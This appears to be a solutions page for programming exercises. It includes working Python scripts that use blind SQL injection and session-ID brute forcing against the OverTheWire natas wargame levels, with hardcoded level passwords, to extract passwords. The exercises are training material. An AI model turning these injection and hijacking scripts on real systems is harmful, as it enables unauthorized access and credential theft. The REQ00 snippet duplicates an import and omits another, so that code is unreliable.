Solutions
======================================================


.. _FIL00_solution:

Solution to FIL00
-----------------------------

Working script
____________________________

.. code-block:: python

    import random

    with open('input.txt', 'w') as f:
        for i in range(10):
            f.write(str(random.randint(1, 10)) + '\n')

    with open('input.txt') as f_in, open('output.txt', 'w') as f_out:
        for l in f_in:
            f_out.write(int(l)*"X" + '\n')

.. _REQ00_solution:

Solution to REQ00
-----------------------------

Working script
____________________________

.. code-block:: python

    from requests.auth import HTTPBasicAuth
    from credentials import username, username

    URL = "https://userdatabase.lsy.pl/employees/report/employee/active"

    auth = HTTPBasicAuth(username, username)

    r = requests.get(URL, auth=auth, verify=False) # to ignore certificate warnings

    print(r.status_code)

.. _REQ01_solution:

Solution to REQ01
-----------------------------

Malicious query
____________________________

The user input that would escape the original query, and add the additional condition on the password is (for the first letter assumed to be "A"):

.. code-block:: sql

    'natas16" AND password LIKE BINARY "A%'

The full query will have then the form

.. code-block:: sql

    SELECT * from users where username="natas16" AND password LIKE BINARY "A%"


Working script
____________________________

.. code-block:: python

    import requests
    from requests.auth import HTTPBasicAuth

    chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

    URL = "http://natas15.natas.labs.overthewire.org"

    auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

    template = 'natas16" AND password LIKE BINARY "{}%'

    letters = ""

    for _ in range(32):
        for letter in chars:
            payload = {"username":template.format(letters+letter)}
            r = requests.get(URL, auth=auth, params=payload)
            if "This user exists" in r.text:
                letters += letter
                print(letters)
                break

    print("Password found {}".format(letters))

.. _REQ02_solution:

Solution to REQ02
-----------------------------

Working script
____________________________

.. code-block:: python

    import requests
    from requests.auth import HTTPBasicAuth
    import re

    URL = "http://natas18.natas.labs.overthewire.org"
    auth=HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

    for sess_id in range(10000):
        print("Trying session ID {}".format(sess_id))
        cookie = {"PHPSESSID":str(sess_id)}
        payload = {"username":"x", "password":"y"}
        r = requests.get(URL, auth=auth, cookies=cookie, params=payload)
        if "You are logged in as a regular user." not in r.text:
            print("Admin session ID found {}".format(sess_id))
            password = re.search("Password: ([A-Za-z0-9]{32})", r.text)
            if password:
                print("Password: "+password.group(1))
            else:
                print("Password not found in the response")
                print(r.text)
            break
        else:
            print("FAILED")
    else:
        print("Brute force on Session ID failed")
